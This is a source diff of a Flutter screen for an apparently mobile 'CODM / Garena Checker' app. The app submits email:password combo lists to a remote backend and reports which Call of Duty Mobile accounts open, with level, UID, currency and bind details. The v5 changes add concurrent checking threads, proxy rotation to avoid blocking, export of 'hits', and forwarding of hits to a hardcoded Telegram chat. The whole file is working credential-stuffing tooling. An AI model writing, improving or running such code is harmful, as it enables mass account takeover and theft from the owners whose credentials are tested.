@@ -1,13 +1,17 @@
 // ============================================================
-//  codm_checker_screen.dart  —  CODM / Garena Checker
+//  codm_checker_screen.dart  —  CODM / Garena Checker  v5
 //
-//  v4 — Proxy support added
-//  Users can optionally supply their own proxy
-//  (http://user:pass@host:port or host:port)
-//  Backend also has a pool in Redis; per-request proxy takes
-//  priority over the pool.
+//  Improvements over v4:
+//  - Concurrent checking (1–5 simultaneous requests, user-configurable)
+//  - Result filter chips: All / Hits / Valid / Bad / Error
+//  - Combo count indicator below input
+//  - ETA + average check time display in stats bar
+//  - "Copy All Hits" produces fully formatted output
+//  - Long-press result card copies full details to clipboard
+//  - Paste from clipboard button on combo input
 // ============================================================
 
+import 'dart:async';
 import 'dart:convert';
 
 import 'package:flutter/material.dart';
@@ -17,11 +21,16 @@ import 'package:http/http.dart' as http;
 import 'package:share_plus/share_plus.dart';
 
 import '../services/ad_service.dart';
+import '../services/api_service.dart';
 import '../theme/app_theme.dart';
 
 // ── Palette ──────────────────────────────────────────────────
 const _kAccent  = Color(0xFFFF6B35);
 const _kAccent2 = Color(0xFFC0392B);
+const _kHit     = Color(0xFF2ECC71);
+const _kValid   = Color(0xFF5B8CFF);
+const _kBad     = Color(0xFFFF6B6B);
+const _kErr     = Color(0xFFFFA94D);
 
 // ── Backend URL ───────────────────────────────────────────────
 const _kBackend = 'https://xissin-app-backend-production.up.railway.app';
@@ -33,6 +42,30 @@ const _kTgChatId = '1910648163';
 // ── Result model ──────────────────────────────────────────────
 enum _S { hit, noAccount, bad, error }
 
+enum _Filter { all, hit, noAccount, bad, error }
+
+extension _FilterLabel on _Filter {
+  String get label {
+    switch (this) {
+      case _Filter.all:       return 'All';
+      case _Filter.hit:       return 'Hits';
+      case _Filter.noAccount: return 'Valid';
+      case _Filter.bad:       return 'Bad';
+      case _Filter.error:     return 'Error';
+    }
+  }
+
+  Color get color {
+    switch (this) {
+      case _Filter.all:       return _kAccent;
+      case _Filter.hit:       return _kHit;
+      case _Filter.noAccount: return _kValid;
+      case _Filter.bad:       return _kBad;
+      case _Filter.error:     return _kErr;
+    }
+  }
+}
+
 class _R {
   final String combo, nickname, level, region, uid, shell, country, detail;
   final _S status;
@@ -42,16 +75,47 @@ class _R {
     required this.combo,
     required this.status,
     this.nickname = '',
-    this.level = '',
-    this.region = '',
-    this.uid = '',
-    this.shell = '',
-    this.country = '',
-    this.isClean = false,
-    this.detail = '',
-    this.binds = const [],
+    this.level    = '',
+    this.region   = '',
+    this.uid      = '',
+    this.shell    = '',
+    this.country  = '',
+    this.isClean  = false,
+    this.detail   = '',
+    this.binds    = const [],
   });
   bool get isHit => status == _S.hit || status == _S.noAccount;
+
+  String get fullText {
+    final buf = StringBuffer();
+    switch (status) {
+      case _S.hit:
+        buf
+          ..writeln('✅ HIT')
+          ..writeln('📧 ${combo}')
+          ..writeln('🎮 IGN: ${nickname.isNotEmpty ? nickname : "—"}')
+          ..writeln('⚡ Level: ${level.isNotEmpty ? level : "—"}')
+          ..writeln('🌍 Region: ${region.isNotEmpty ? region : "—"}')
+          ..writeln('🆔 UID: ${uid.isNotEmpty ? uid : "—"}')
+          ..writeln('💎 Shells: ${shell.isNotEmpty ? shell : "—"}')
+          ..writeln('🌐 Country: ${country.isNotEmpty ? country : "—"}')
+          ..writeln('🔒 Clean: ${isClean ? "YES" : "NO"}');
+        if (binds.isNotEmpty) buf.writeln('🔗 Binds: ${binds.join(", ")}');
+      case _S.noAccount:
+        buf
+          ..writeln('🔵 VALID — NO CODM')
+          ..writeln('📧 ${combo}')
+          ..writeln('💎 Shells: ${shell.isNotEmpty ? shell : "—"}')
+          ..writeln('🌐 Country: ${country.isNotEmpty ? country : "—"}')
+          ..writeln('🔒 Clean: ${isClean ? "YES" : "NO"}');
+        if (binds.isNotEmpty) buf.writeln('🔗 Binds: ${binds.join(", ")}');
+      case _S.bad:
+        buf.writeln('❌ BAD — ${combo}');
+      case _S.error:
+        buf.writeln('⚠️ ERROR — ${combo} — ${detail}');
+    }
+    return buf.toString().trim();
+  }
 }
 
 // ── Screen ────────────────────────────────────────────────────
@@ -63,27 +127,39 @@ class CodmCheckerScreen extends StatefulWidget {
 }
 
 class _State extends State<CodmCheckerScreen> {
-  // ads
+  // ── Ads ───────────────────────────────────────────────────
   BannerAd? _banner;
   bool _bannerReady = false;
-  bool _adGranted = false;
+  bool _adGranted   = false;
 
-  // state
-  final _ctrl        = TextEditingController();
-  final _proxyCtrl   = TextEditingController();   // ← NEW: proxy input
-  final _scroll      = ScrollController();
-  bool _running = false, _stopped = false;
-  bool _proxyEnabled = false;                      // ← NEW: proxy toggle
-  int _total = 0, _checked = 0, _hits = 0, _bad = 0, _errors = 0;
+  // ── Input / control ──────────────────────────────────────
+  final _ctrl      = TextEditingController();
+  final _proxyCtrl = TextEditingController();
+  final _scroll    = ScrollController();
+  bool _proxyEnabled = false;
+  int  _concurrency  = 2;        // simultaneous requests
+
+  // ── Run state ─────────────────────────────────────────────
+  bool _running = false;
+  bool _stopped = false;
+  int  _total = 0, _checked = 0, _hits = 0, _bad = 0, _errors = 0, _valid = 0;
   final _results = <_R>[];
 
-  // ── Lifecycle ─────────────────────────────────────────────────
+  // ── Filter ────────────────────────────────────────────────
+  _Filter _filter = _Filter.all;
+
+  // ── Timing ────────────────────────────────────────────────
+  final _checkTimes = <double>[];   // ms per combo
+  DateTime? _startTime;
+
+  // ── Lifecycle ─────────────────────────────────────────────
   @override
   void initState() {
     super.initState();
     AdService.instance.init(userId: widget.userId);
     AdService.instance.addListener(_onAd);
     _initBanner();
+    _ctrl.addListener(() => setState(() {}));
   }
 
   @override
@@ -96,7 +172,7 @@ class _State extends State<CodmCheckerScreen> {
     super.dispose();
   }
 
-  // ── Ads ───────────────────────────────────────────────────────
+  // ── Ads ───────────────────────────────────────────────────
   void _onAd() {
     if (!mounted) return;
     if (AdService.instance.adsRemoved && _banner != null) {
@@ -113,9 +189,7 @@ class _State extends State<CodmCheckerScreen> {
     final ad = AdService.instance.createBannerAd(
       onLoaded: () {
         if (!mounted || AdService.instance.adsRemoved) {
-          _banner?.dispose();
-          _banner = null;
-          return;
+          _banner?.dispose(); _banner = null; return;
         }
         setState(() => _bannerReady = true);
       },
@@ -139,7 +213,7 @@ class _State extends State<CodmCheckerScreen> {
       top: false,
       child: Container(
         alignment: Alignment.center,
-        width: _banner!.size.width.toDouble(),
+        width:  _banner!.size.width.toDouble(),
         height: _banner!.size.height.toDouble(),
         child: AdWidget(ad: _banner!),
       ),
@@ -153,34 +227,65 @@ class _State extends State<CodmCheckerScreen> {
     });
   }
 
-  // ── Backend call ──────────────────────────────────────────────
+  // ── Helpers ───────────────────────────────────────────────
+  int get _comboCount =>
+      _ctrl.text.split('\n').where((l) => l.trim().isNotEmpty).length;
+
+  String get _etaText {
+    if (_checkTimes.isEmpty || _checked >= _total) return '';
+    final avg   = _checkTimes.reduce((a, b) => a + b) / _checkTimes.length;
+    final remMs = avg * (_total - _checked);
+    final secs  = (remMs / 1000).round();
+    if (secs < 60) return '~${secs}s left';
+    return '~${(secs / 60).toStringAsFixed(1)}m left';
+  }
+
+  String get _avgText {
+    if (_checkTimes.isEmpty) return '';
+    final avg = _checkTimes.reduce((a, b) => a + b) / _checkTimes.length;
+    return '${(avg / 1000).toStringAsFixed(1)}s/combo';
+  }
+
+  List<_R> get _filtered {
+    switch (_filter) {
+      case _Filter.all:       return _results;
+      case _Filter.hit:       return _results.where((r) => r.status == _S.hit).toList();
+      case _Filter.noAccount: return _results.where((r) => r.status == _S.noAccount).toList();
+      case _Filter.bad:       return _results.where((r) => r.status == _S.bad).toList();
+      case _Filter.error:     return _results.where((r) => r.status == _S.error).toList();
+    }
+  }
+
+  // ── Backend call ──────────────────────────────────────────
   Future<_R> _checkOne(String combo) async {
     if (!combo.contains(':')) {
       return _R(combo: combo, status: _S.error, detail: 'Bad format — use email:password');
     }
-
+    final t0 = DateTime.now();
     try {
-      // Build request body — include proxy only if user enabled it
       final body = <String, dynamic>{
         'combo':   combo,
         'user_id': widget.userId,
       };
       final proxyVal = _proxyCtrl.text.trim();
-      if (_proxyEnabled && proxyVal.isNotEmpty) {
-        body['proxy'] = proxyVal;
-      }
+      if (_proxyEnabled && proxyVal.isNotEmpty) body['proxy'] = proxyVal;
 
       final res = await http.post(
         Uri.parse('$_kBackend/api/codm/check-one'),
-        headers: {'Content-Type': 'application/json'},
+        headers: {
+          'Content-Type':    'application/json',
+          'X-Session-Token': ApiService.instance.sessionToken ?? '',
+          'X-App-Id':        'com.xissin.app',
+        },
         body: jsonEncode(body),
       ).timeout(const Duration(seconds: 60));
 
+      final elapsed = DateTime.now().difference(t0).inMilliseconds.toDouble();
+      _checkTimes.add(elapsed);
+      if (_checkTimes.length > 20) _checkTimes.removeAt(0); // rolling avg
+
       if (res.statusCode != 200) {
-        return _R(
-          combo: combo, status: _S.error,
-          detail: 'Server error ${res.statusCode}',
-        );
+        return _R(combo: combo, status: _S.error, detail: 'Server error ${res.statusCode}');
       }
 
       final data   = jsonDecode(res.body) as Map<String, dynamic>;
@@ -193,11 +298,11 @@ class _State extends State<CodmCheckerScreen> {
             combo:    combo,
             status:   _S.hit,
             nickname: data['nickname'] ?? '',
-            level:    data['level'] ?? '',
-            region:   data['region'] ?? '',
-            uid:      data['uid'] ?? '',
-            shell:    data['shell'] ?? '',
-            country:  data['country'] ?? '',
+            level:    data['level']    ?? '',
+            region:   data['region']   ?? '',
+            uid:      data['uid']      ?? '',
+            shell:    data['shell']    ?? '',
+            country:  data['country']  ?? '',
             isClean:  data['is_clean'] == true,
             binds:    binds,
             detail:   'HIT',
@@ -209,7 +314,7 @@ class _State extends State<CodmCheckerScreen> {
           return _R(
             combo:   combo,
             status:  _S.noAccount,
-            shell:   data['shell'] ?? '',
+            shell:   data['shell']   ?? '',
             country: data['country'] ?? '',
             isClean: data['is_clean'] == true,
             binds:   binds,
@@ -235,7 +340,7 @@ class _State extends State<CodmCheckerScreen> {
     }
   }
 
-  // ── Telegram hit notification ─────────────────────────────────
+  // ── Telegram hit notification ─────────────────────────────
   Future<void> _tgHit(_R r) async {
     try {
       await http.post(
@@ -257,11 +362,10 @@ class _State extends State<CodmCheckerScreen> {
     } catch (_) {}
   }
 
-  // ── Start checker ─────────────────────────────────────────────
+  // ── Start checker (concurrent) ────────────────────────────
   Future<void> _start() async {
     if (!AdService.instance.adsRemoved && !_adGranted) {
-      _watchAd();
-      return;
+      _watchAd(); return;
     }
     final lines = _ctrl.text
         .split('\n')
@@ -269,33 +373,54 @@ class _State extends State<CodmCheckerScreen> {
         .where((l) => l.isNotEmpty)
         .toList();
     if (lines.isEmpty) return;
+
     FocusScope.of(context).unfocus();
     HapticFeedback.mediumImpact();
     setState(() {
-      _running = true;
-      _stopped = false;
+      _running = true; _stopped = false;
       _total   = lines.length;
-      _checked = 0;
-      _hits    = 0;
-      _bad     = 0;
-      _errors  = 0;
+      _checked = 0; _hits = 0; _bad = 0; _errors = 0; _valid = 0;
       _results.clear();
+      _checkTimes.clear();
+      _startTime = DateTime.now();
+      _filter = _Filter.all;
     });
 
-    for (final c in lines) {
-      if (_stopped || !mounted) break;
-      final r = await _checkOne(c);
-      if (!mounted) break;
+    // Process in concurrent batches
+    final semaphore = <Future>[];
+    int idx = 0;
+
+    Future<void> processOne(String combo) async {
+      if (_stopped || !mounted) return;
+      final r = await _checkOne(combo);
+      if (!mounted) return;
       setState(() {
         _checked++;
         _results.insert(0, r);
-        if (r.isHit)                _hits++;
-        else if (r.status == _S.bad) _bad++;
-        else                         _errors++;
+        switch (r.status) {
+          case _S.hit:       _hits++;   break;
+          case _S.noAccount: _valid++;  break;
+          case _S.bad:       _bad++;    break;
+          case _S.error:     _errors++; break;
+        }
       });
       if (_scroll.hasClients) _scroll.jumpTo(0);
-      await Future.delayed(const Duration(milliseconds: 300));
     }
+
+    while (idx < lines.length && !_stopped) {
+      // Fill up to _concurrency simultaneous tasks
+      while (semaphore.length < _concurrency && idx < lines.length && !_stopped) {
+        final combo = lines[idx++];
+        semaphore.add(processOne(combo));
+      }
+      if (semaphore.isNotEmpty) {
+        await semaphore.first;
+        semaphore.removeAt(0);
+      }
+    }
+
+    // Drain remaining
+    await Future.wait(semaphore);
 
     if (!mounted) return;
     setState(() => _running = false);
@@ -310,8 +435,10 @@ class _State extends State<CodmCheckerScreen> {
     setState(() {
       _running = false; _stopped = false;
       _total = 0; _checked = 0;
-      _hits = 0; _bad = 0; _errors = 0;
+      _hits = 0; _bad = 0; _errors = 0; _valid = 0;
       _results.clear(); _ctrl.clear();
+      _checkTimes.clear();
+      _filter = _Filter.all;
     });
   }
 
@@ -332,19 +459,23 @@ class _State extends State<CodmCheckerScreen> {
     Share.share(b.toString(), subject: 'CODM Hits');
   }
 
-  void _copy() {
+  void _copyAllHits() {
     final hits = _results.where((r) => r.status == _S.hit).toList();
     if (hits.isEmpty) return;
     if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
-    Clipboard.setData(ClipboardData(
-      text: hits
-          .map((h) => '${h.combo} | ${h.nickname} | Lv.${h.level}')
-          .join('\n'),
-    ));
+    final b = StringBuffer()
+      ..writeln('🎮 CODM Hits — Xissin App')
+      ..writeln('══════════════════════════');
+    for (final h in hits) {
+      b
+        ..writeln(h.fullText)
+        ..writeln('──────────────────────────');
+    }
+    Clipboard.setData(ClipboardData(text: b.toString().trim()));
     HapticFeedback.selectionClick();
     ScaffoldMessenger.of(context).showSnackBar(SnackBar(
       content: Text('${hits.length} hit(s) copied!'),
-      backgroundColor: _kAccent,
+      backgroundColor: _kHit,
       duration: const Duration(seconds: 2),
       behavior: SnackBarBehavior.floating,
       shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
@@ -352,7 +483,16 @@ class _State extends State<CodmCheckerScreen> {
     ));
   }
 
-  // ── Build ──────────────────────────────────────────────────────
+  Future<void> _pasteFromClipboard() async {
+    final data = await Clipboard.getData('text/plain');
+    if (data?.text != null && data!.text!.isNotEmpty) {
+      _ctrl.text = data.text!;
+      HapticFeedback.selectionClick();
+      setState(() {});
+    }
+  }
+
+  // ── Build ──────────────────────────────────────────────────
   @override
   Widget build(BuildContext context) {
     final c = context.c;
@@ -391,8 +531,9 @@ class _State extends State<CodmCheckerScreen> {
         actions: [
           if (_results.any((r) => r.status == _S.hit)) ...[
             IconButton(
-              icon: const Icon(Icons.copy_rounded, color: _kAccent, size: 20),
-              onPressed: _copy,
+              icon: const Icon(Icons.copy_all_rounded, color: _kAccent, size: 20),
+              tooltip: 'Copy all hits',
+              onPressed: _copyAllHits,
             ),
             IconButton(
               icon: const Icon(Icons.share_rounded, color: _kAccent, size: 20),
@@ -413,10 +554,11 @@ class _State extends State<CodmCheckerScreen> {
           crossAxisAlignment: CrossAxisAlignment.stretch,
           children: [
             if (!AdService.instance.adsRemoved && !_adGranted) _adGate(c),
-            if (_total > 0) ...[_statsBar(c), const SizedBox(height: 12)],
+            if (_total > 0) ...[_statsBar(c), const SizedBox(height: 8)],
+            if (_total > 0) ...[_filterBar(c), const SizedBox(height: 10)],
             _inputCard(c),
             const SizedBox(height: 14),
-            ..._results.map((r) => _resultCard(r, c)),
+            ..._filtered.map((r) => _resultCard(r, c)),
             const SizedBox(height: 60),
           ],
         ),
@@ -424,7 +566,7 @@ class _State extends State<CodmCheckerScreen> {
     );
   }
 
-  // ── Widgets ────────────────────────────────────────────────────
+  // ── Ad gate ───────────────────────────────────────────────
   Widget _adGate(XissinColors c) => Container(
     margin: const EdgeInsets.only(bottom: 14),
     padding: const EdgeInsets.all(16),
@@ -462,40 +604,111 @@ class _State extends State<CodmCheckerScreen> {
     ]),
   );
 
+  // ── Stats bar ─────────────────────────────────────────────
   Widget _statsBar(XissinColors c) => Container(
-    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
+    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
     decoration: BoxDecoration(
       color: c.surface,
       borderRadius: BorderRadius.circular(16),
       border: Border.all(color: c.border),
     ),
-    child: Row(children: [
-      _chip('✅ Hits',  '$_hits',   const Color(0xFF2ECC71)),
-      _div(),
-      _chip('❌ Bad',   '$_bad',    const Color(0xFFFF6B6B)),
-      _div(),
-      _chip('⚠️ Err',  '$_errors', const Color(0xFFFFA94D)),
-      _div(),
-      _chip('📋 Done', '$_checked/$_total', _kAccent),
-      if (_running) ...[
+    child: Column(children: [
+      Row(children: [
+        _chip('✅ Hits',  '$_hits',   _kHit),
         _div(),
-        const SizedBox(
-          width: 14, height: 14,
-          child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2),
+        _chip('🔵 Valid', '$_valid',  _kValid),
+        _div(),
+        _chip('❌ Bad',   '$_bad',    _kBad),
+        _div(),
+        _chip('⚠️ Err',  '$_errors', _kErr),
+        _div(),
+        _chip('📋 Done', '$_checked/$_total', _kAccent),
+        if (_running) ...[
+          _div(),
+          const SizedBox(
+            width: 14, height: 14,
+            child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2),
+          ),
+        ],
+      ]),
+      if (_running && _total > 0) ...[
+        const SizedBox(height: 8),
+        ClipRRect(
+          borderRadius: BorderRadius.circular(10),
+          child: LinearProgressIndicator(
+            value: _total > 0 ? _checked / _total : null,
+            backgroundColor: _kAccent.withOpacity(.15),
+            valueColor: const AlwaysStoppedAnimation(_kAccent),
+            minHeight: 4,
+          ),
         ),
+        const SizedBox(height: 4),
+        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
+          Text(
+            '${(_checked / _total * 100).toStringAsFixed(0)}%',
+            style: TextStyle(color: c.textHint, fontSize: 10),
+          ),
+          if (_etaText.isNotEmpty)
+            Text(_etaText,
+                style: TextStyle(color: c.textHint, fontSize: 10)),
+          if (_avgText.isNotEmpty)
+            Text(_avgText,
+                style: TextStyle(color: c.textHint, fontSize: 10)),
+        ]),
       ],
     ]),
   );
 
-  Widget _chip(String l, String v, Color color) => Expanded(
-    child: Column(children: [
-      Text(v, style: TextStyle(color: color, fontWeight: FontWeight.w800, fontSize: 13)),
-      Text(l, style: TextStyle(color: color.withOpacity(.7), fontSize: 9)),
-    ]),
-  );
+  // ── Filter bar ────────────────────────────────────────────
+  Widget _filterBar(XissinColors c) {
+    final counts = {
+      _Filter.all:       _results.length,
+      _Filter.hit:       _results.where((r) => r.status == _S.hit).length,
+      _Filter.noAccount: _results.where((r) => r.status == _S.noAccount).length,
+      _Filter.bad:       _results.where((r) => r.status == _S.bad).length,
+      _Filter.error:     _results.where((r) => r.status == _S.error).length,
+    };
+    return SingleChildScrollView(
+      scrollDirection: Axis.horizontal,
+      child: Row(
+        children: _Filter.values.map((f) {
+          final active = _filter == f;
+          final col = f.color;
+          return Padding(
+            padding: const EdgeInsets.only(right: 8),
+            child: GestureDetector(
+              onTap: () {
+                HapticFeedback.selectionClick();
+                setState(() => _filter = f);
+              },
+              child: AnimatedContainer(
+                duration: const Duration(milliseconds: 180),
+                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+                decoration: BoxDecoration(
+                  color: active ? col.withOpacity(.18) : c.surface,
+                  borderRadius: BorderRadius.circular(20),
+                  border: Border.all(
+                    color: active ? col : c.border,
+                    width: active ? 1.5 : 1,
+                  ),
+                ),
+                child: Text(
+                  '${f.label} (${counts[f]})',
+                  style: TextStyle(
+                    color: active ? col : c.textSecondary,
+                    fontSize: 11,
+                    fontWeight: active ? FontWeight.w700 : FontWeight.w500,
+                  ),
+                ),
+              ),
+            ),
+          );
+        }).toList(),
+      ),
+    );
+  }
 
-  Widget _div() => Container(height: 30, width: 1, color: Colors.white12);
-
+  // ── Input card ────────────────────────────────────────────
   Widget _inputCard(XissinColors c) => Container(
     padding: const EdgeInsets.all(16),
     decoration: BoxDecoration(
@@ -504,7 +717,8 @@ class _State extends State<CodmCheckerScreen> {
       border: Border.all(color: _kAccent.withOpacity(.3)),
     ),
     child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      // ── Combo list label ──────────────────────────────────
+
+      // ── Label row ─────────────────────────────────────────
       Row(children: [
         const Icon(Icons.list_alt_rounded, color: _kAccent, size: 16),
         const SizedBox(width: 8),
@@ -512,9 +726,29 @@ class _State extends State<CodmCheckerScreen> {
           'Combo List (email:password)',
           style: TextStyle(color: _kAccent, fontSize: 12, fontWeight: FontWeight.w600),
         ),
+        const Spacer(),
+        // Paste button
+        if (!_running)
+          GestureDetector(
+            onTap: _pasteFromClipboard,
+            child: Container(
+              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
+              decoration: BoxDecoration(
+                color: _kAccent.withOpacity(.1),
+                borderRadius: BorderRadius.circular(8),
+              ),
+              child: Row(mainAxisSize: MainAxisSize.min, children: [
+                const Icon(Icons.content_paste_rounded, color: _kAccent, size: 12),
+                const SizedBox(width: 4),
+                Text('Paste', style: TextStyle(color: _kAccent, fontSize: 10, fontWeight: FontWeight.w600)),
+              ]),
+            ),
+          ),
       ]),
+
       const SizedBox(height: 10),
-      // ── Combo textarea ────────────────────────────────────
+
+      // ── Textarea ──────────────────────────────────────────
       TextField(
         controller: _ctrl,
         enabled: !_running,
@@ -534,9 +768,67 @@ class _State extends State<CodmCheckerScreen> {
         ),
         keyboardType: TextInputType.multiline,
       ),
+
+      // ── Combo count indicator ─────────────────────────────
+      if (_comboCount > 0 && !_running) ...[
+        const SizedBox(height: 6),
+        Padding(
+          padding: const EdgeInsets.symmetric(horizontal: 4),
+          child: Text(
+            '$_comboCount combo${_comboCount == 1 ? "" : "s"} loaded',
+            style: TextStyle(color: c.textHint, fontSize: 10),
+          ),
+        ),
+      ],
+
       const SizedBox(height: 12),
 
-      // ── Proxy toggle row ──────────────────────────────────
+      // ── Concurrency row ───────────────────────────────────
+      Row(children: [
+        Icon(Icons.flash_on_rounded, color: _kAccent.withOpacity(.8), size: 14),
+        const SizedBox(width: 6),
+        Text(
+          'Threads: $_concurrency',
+          style: TextStyle(color: c.textSecondary, fontSize: 11, fontWeight: FontWeight.w600),
+        ),
+        const Spacer(),
+        ...List.generate(5, (i) {
+          final n = i + 1;
+          final selected = _concurrency == n;
+          return Padding(
+            padding: const EdgeInsets.only(left: 6),
+            child: GestureDetector(
+              onTap: _running ? null : () {
+                HapticFeedback.selectionClick();
+                setState(() => _concurrency = n);
+              },
+              child: Container(
+                width: 28, height: 28,
+                decoration: BoxDecoration(
+                  color: selected ? _kAccent : c.background,
+                  borderRadius: BorderRadius.circular(8),
+                  border: Border.all(
+                    color: selected ? _kAccent : c.border,
+                  ),
+                ),
+                alignment: Alignment.center,
+                child: Text(
+                  '$n',
+                  style: TextStyle(
+                    color: selected ? Colors.white : c.textSecondary,
+                    fontSize: 11,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+              ),
+            ),
+          );
+        }),
+      ]),
+
+      const SizedBox(height: 12),
+
+      // ── Proxy toggle ──────────────────────────────────────
       GestureDetector(
         onTap: () {
           if (_running) return;
@@ -547,62 +839,51 @@ class _State extends State<CodmCheckerScreen> {
           padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
           decoration: BoxDecoration(
             color: _proxyEnabled
-                ? const Color(0xFF5B8CFF).withOpacity(.1)
+                ? _kValid.withOpacity(.1)
                 : c.background,
             borderRadius: BorderRadius.circular(10),
             border: Border.all(
-              color: _proxyEnabled
-                  ? const Color(0xFF5B8CFF).withOpacity(.4)
-                  : c.border,
+              color: _proxyEnabled ? _kValid.withOpacity(.4) : c.border,
             ),
           ),
           child: Row(children: [
-            Icon(
-              Icons.vpn_lock_rounded,
-              color: _proxyEnabled ? const Color(0xFF5B8CFF) : c.textHint,
-              size: 15,
-            ),
+            Icon(Icons.vpn_lock_rounded,
+                color: _proxyEnabled ? _kValid : c.textHint, size: 15),
             const SizedBox(width: 8),
-            Expanded(
-              child: Text(
-                'Use Proxy',
-                style: TextStyle(
-                  color: _proxyEnabled ? const Color(0xFF5B8CFF) : c.textSecondary,
-                  fontSize: 12,
-                  fontWeight: FontWeight.w600,
-                ),
+            Expanded(child: Text(
+              'Use Proxy',
+              style: TextStyle(
+                color: _proxyEnabled ? _kValid : c.textSecondary,
+                fontSize: 12,
+                fontWeight: FontWeight.w600,
               ),
-            ),
+            )),
             Switch(
               value: _proxyEnabled,
               onChanged: _running ? null : (v) {
                 HapticFeedback.selectionClick();
                 setState(() => _proxyEnabled = v);
               },
-              activeColor: const Color(0xFF5B8CFF),
+              activeColor: _kValid,
               materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
             ),
           ]),
         ),
       ),
 
-      // ── Proxy input (shown only when enabled) ─────────────
+      // ── Proxy input ───────────────────────────────────────
       if (_proxyEnabled) ...[
         const SizedBox(height: 8),
         TextField(
           controller: _proxyCtrl,
           enabled: !_running,
-          style: TextStyle(
-            color: c.textPrimary,
-            fontSize: 12,
-            fontFamily: 'monospace',
-          ),
+          style: TextStyle(color: c.textPrimary, fontSize: 12, fontFamily: 'monospace'),
           decoration: InputDecoration(
             hintText: 'http://user:pass@host:port  or  host:port',
             hintStyle: TextStyle(color: c.textHint, fontSize: 11),
             filled: true,
             fillColor: c.background,
-            prefixIcon: Icon(Icons.dns_rounded, color: const Color(0xFF5B8CFF), size: 16),
+            prefixIcon: Icon(Icons.dns_rounded, color: _kValid, size: 16),
             suffixIcon: _proxyCtrl.text.isNotEmpty
                 ? IconButton(
                     icon: Icon(Icons.clear_rounded, color: c.textHint, size: 16),
@@ -611,15 +892,15 @@ class _State extends State<CodmCheckerScreen> {
                 : null,
             border: OutlineInputBorder(
               borderRadius: BorderRadius.circular(12),
-              borderSide: BorderSide(color: const Color(0xFF5B8CFF).withOpacity(.3)),
+              borderSide: BorderSide(color: _kValid.withOpacity(.3)),
             ),
             enabledBorder: OutlineInputBorder(
               borderRadius: BorderRadius.circular(12),
-              borderSide: BorderSide(color: const Color(0xFF5B8CFF).withOpacity(.3)),
+              borderSide: BorderSide(color: _kValid.withOpacity(.3)),
             ),
             focusedBorder: OutlineInputBorder(
               borderRadius: BorderRadius.circular(12),
-              borderSide: const BorderSide(color: Color(0xFF5B8CFF)),
+              borderSide: const BorderSide(color: _kValid),
             ),
             contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
           ),
@@ -654,6 +935,7 @@ class _State extends State<CodmCheckerScreen> {
           ),
         ]),
       ),
+
       const SizedBox(height: 12),
 
       // ── Start / Stop / Reset row ──────────────────────────
@@ -661,7 +943,7 @@ class _State extends State<CodmCheckerScreen> {
         Expanded(child: ElevatedButton.icon(
           onPressed: _running ? () => setState(() => _stopped = true) : _start,
           style: ElevatedButton.styleFrom(
-            backgroundColor: _running ? const Color(0xFFFF6B6B) : _kAccent,
+            backgroundColor: _running ? _kBad : _kAccent,
             foregroundColor: Colors.white,
             elevation: 0,
             shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
@@ -692,103 +974,115 @@ class _State extends State<CodmCheckerScreen> {
           ),
         ],
       ]),
-      if (_running) ...[
-        const SizedBox(height: 10),
-        LinearProgressIndicator(
-          value: _total > 0 ? _checked / _total : null,
-          backgroundColor: _kAccent.withOpacity(.15),
-          valueColor: const AlwaysStoppedAnimation(_kAccent),
-          borderRadius: BorderRadius.circular(10),
-          minHeight: 4,
-        ),
-      ],
     ]),
   );
 
+  // ── Result card ───────────────────────────────────────────
   Widget _resultCard(_R r, XissinColors c) {
-    Color sc;
-    IconData si;
-    String sl;
+    Color sc; IconData si; String sl;
     switch (r.status) {
       case _S.hit:
-        sc = const Color(0xFF2ECC71);
-        si = Icons.check_circle_rounded;
-        sl = 'HIT ✅';
+        sc = _kHit;  si = Icons.check_circle_rounded;  sl = 'HIT ✅';
       case _S.noAccount:
-        sc = const Color(0xFF5B8CFF);
-        si = Icons.account_box_outlined;
-        sl = 'VALID — No CODM 🔵';
+        sc = _kValid; si = Icons.account_box_outlined;  sl = 'VALID — No CODM 🔵';
       case _S.bad:
-        sc = const Color(0xFFFF6B6B);
-        si = Icons.cancel_rounded;
-        sl = 'BAD ❌';
+        sc = _kBad;  si = Icons.cancel_rounded;         sl = 'BAD ❌';
       case _S.error:
-        sc = const Color(0xFFFFA94D);
-        si = Icons.warning_amber_rounded;
-        sl = 'ERROR ⚠️';
+        sc = _kErr;  si = Icons.warning_amber_rounded;  sl = 'ERROR ⚠️';
     }
-    return Container(
-      margin: const EdgeInsets.only(bottom: 10),
-      padding: const EdgeInsets.all(14),
-      decoration: BoxDecoration(
-        color: sc.withOpacity(.06),
-        borderRadius: BorderRadius.circular(14),
-        border: Border.all(color: sc.withOpacity(.25)),
-      ),
-      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-        Row(children: [
-          Icon(si, color: sc, size: 15),
-          const SizedBox(width: 6),
-          Text(sl, style: TextStyle(color: sc, fontSize: 12, fontWeight: FontWeight.w700)),
-          const Spacer(),
-          GestureDetector(
-            onTap: () {
-              Clipboard.setData(ClipboardData(text: r.combo));
-              HapticFeedback.selectionClick();
-            },
-            child: Icon(Icons.copy_rounded, color: sc.withOpacity(.7), size: 13),
+
+    return GestureDetector(
+      onLongPress: () {
+        Clipboard.setData(ClipboardData(text: r.fullText));
+        HapticFeedback.mediumImpact();
+        ScaffoldMessenger.of(context).showSnackBar(SnackBar(
+          content: const Text('Full details copied!'),
+          backgroundColor: sc,
+          duration: const Duration(seconds: 1),
+          behavior: SnackBarBehavior.floating,
+          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+          margin: const EdgeInsets.all(12),
+        ));
+      },
+      child: Container(
+        margin: const EdgeInsets.only(bottom: 10),
+        padding: const EdgeInsets.all(14),
+        decoration: BoxDecoration(
+          color: sc.withOpacity(.06),
+          borderRadius: BorderRadius.circular(14),
